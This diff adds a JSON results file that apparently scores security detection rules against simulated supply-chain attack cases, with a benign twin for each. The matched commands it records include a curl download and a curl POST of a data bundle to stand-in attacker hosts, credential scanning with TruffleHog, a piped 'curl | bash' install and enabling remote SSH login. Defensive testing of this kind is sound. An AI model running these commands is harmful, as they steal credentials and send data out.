@@ -1,0 +1,149 @@
+{
+ "rules": 145,
+ "skipped": {
+  "esql": 18,
+  "new_terms": 14,
+  "kuery": 7,
+  "threshold": 1
+ },
+ "skipped_names": {
+  "esql": [
+   "LLM-Based Curl Activity Triage",
+   "Curl Download Activity from npm Package Install",
+   "LLM-Based Wget Activity Triage",
+   "Potential Credential Discovery via Recursive Grep",
+   "Multi-Cloud CLI Token and Credential Access Commands",
+   "Multiple Credential Access by VS Code or Cursor IDE Descendant",
+   "Long Base64 Encoded Command via Scripting Interpreter",
+   "Command Line Obfuscation via Whitespace Padding",
+   "Suspicious Python Shell Command Execution",
+   "GenAI Agent Instruction File Written to Downloads",
+   "Shell or Suspicious Process Spawned by Ray Worker",
+   "Suspicious Command Execution from Visual Studio Code",
+   "Suspicious IDE Extension Installation from VSIX",
+   "Suspicious AWS S3 Connection via Script Interpreter",
+   "Suspicious TCC Access Granted for User Folders",
+   "SSFileCopySender Executed as Root",
+   "SSFileCopyReceiver Writing to Common Persistence Locations",
+   "Privilege Escalation via Parallels Appliance Extract Argument Injection"
+  ],
+  "new_terms": [
+   "GenAI Process Connection to Unusual Domain",
+   "Uncommon DNS Request via Bun or Node.js",
+   "Suspicious Instance Metadata Service (IMDS) API Request",
+   "Unusual Process Modifying GenAI Configuration File",
+   "AWS Control Plane Access by Suspicious Process",
+   "AWS SSM `SendCommand` with Run Shell Command Parameters",
+   "Potential Third-Party Cloud Storage Client Execution",
+   "New USB Storage Device Mounted",
+   "SSH Authorized Keys File Activity",
+   "Unusual Network Connection to Suspicious Top Level Domain",
+   "Unusual Network Connection to Suspicious Web Service",
+   "First Time Python Accessed Sensitive Credential Files",
+   "First Time Python Spawned a Shell on Host",
+   "First Time Python Created a LaunchAgent or LaunchDaemon"
+  ],
+  "kuery": [
+   "AWS Audit or Security Service Tampering via CLI",
+   "Cloud Offensive Framework Execution",
+   "AWS SSM Session Manager Child Process Execution",
+   "Potential Destructive AWS CLI Command Executed by GenAI Agent",
+   "Bash Shell Profile Modification",
+   "Potential Privilege Escalation via Sudoers File Modification",
+   "Potential Persistence via Login Hook"
+  ],
+  "threshold": [
+   "Potential macOS SSH Brute Force Detected"
+  ]
+ },
+ "unparsed": [],
+ "cases": {
+  "axios/attack": {
+   "Node.js Pre or Post-Install Script Execution": {
+    "severity": "medium",
+    "count": 1,
+    "first": "sh -c node setup.js"
+   }
+  },
+  "axios/twin": {},
+  "contagious-interview/attack": {
+   "Curl or Wget Spawned via Node.js": {
+    "severity": "medium",
+    "count": 3,
+    "first": "/bin/sh -c curl -Lo \"/Users/admin/.nvc\" \"http://cdn.shop-metrics.example:1224/client/7\""
+   },
+   "Script Interpreter Connection to Non-Standard Port": {
+    "severity": "medium",
+    "count": 3,
+    "first": "node test/smoke.js"
+   }
+  },
+  "contagious-interview/twin": {
+   "External IP Address Discovery via Curl": {
+    "severity": "low",
+    "count": 1,
+    "first": "curl -s http://ip-api.com/json"
+   }
+  },
+  "contagious-interview-task/attack": {
+   "Curl or Wget Spawned via Node.js": {
+    "severity": "medium",
+    "count": 3,
+    "first": "/bin/sh -c curl -Lo \"/Users/admin/.nvc\" \"http://cdn.shop-metrics.example:1224/client/7\""
+   },
+   "Script Interpreter Connection to Non-Standard Port": {
+    "severity": "medium",
+    "count": 3,
+    "first": "node env-setup.js"
+   }
+  },
+  "contagious-interview-task/twin": {},
+  "cursor-extension/attack": {
+   "Remote SSH Login Enabled via systemsetup Command": {
+    "severity": "medium",
+    "count": 1,
+    "first": "systemsetup -setremotelogin on"
+   }
+  },
+  "cursor-extension/twin": {
+   "External IP Address Discovery via Curl": {
+    "severity": "low",
+    "count": 1,
+    "first": "curl -s https://ifconfig.me"
+   }
+  },
+  "glassworm/attack": {},
+  "glassworm/twin": {},
+  "litellm/attack": {
+   "Data Encrypted via OpenSSL Utility": {
+    "severity": "low",
+    "count": 1,
+    "first": "openssl enc -aes-256-cbc -in collected -out data.enc -pass file:key.bin -pbkdf2"
+   },
+   "Potential Data Exfiltration Through Curl": {
+    "severity": "medium",
+    "count": 1,
+    "first": "curl -s -o /dev/null -w %{http_code} -X POST https://models.acme-tokens.example/ -H Content-Type: application/octet-stream -H X-Filename: bundle.tar.gz --data-binary @bundle.tar.gz"
+   }
+  },
+  "litellm/twin": {},
+  "shai-hulud/attack": {
+   "Curl or Wget Spawned via Node.js": {
+    "severity": "medium",
+    "count": 1,
+    "first": "bash -c curl -fsSL https://bun.sh/install | bash"
+   },
+   "Credential Access via TruffleHog Execution": {
+    "severity": "medium",
+    "count": 2,
+    "first": "/var/folders/p7/f_99nxmj7s16qrxbl0cbpz4r0000gn/T/w-MOq88v/th/trufflehog filesystem /Users/admin --json --no-verification"
+   },
+   "Node.js Pre or Post-Install Script Execution": {
+    "severity": "medium",
+    "count": 1,
+    "first": "sh -c node setup.mjs"
+   }
+  },
+  "shai-hulud/twin": {}
+ }
+}
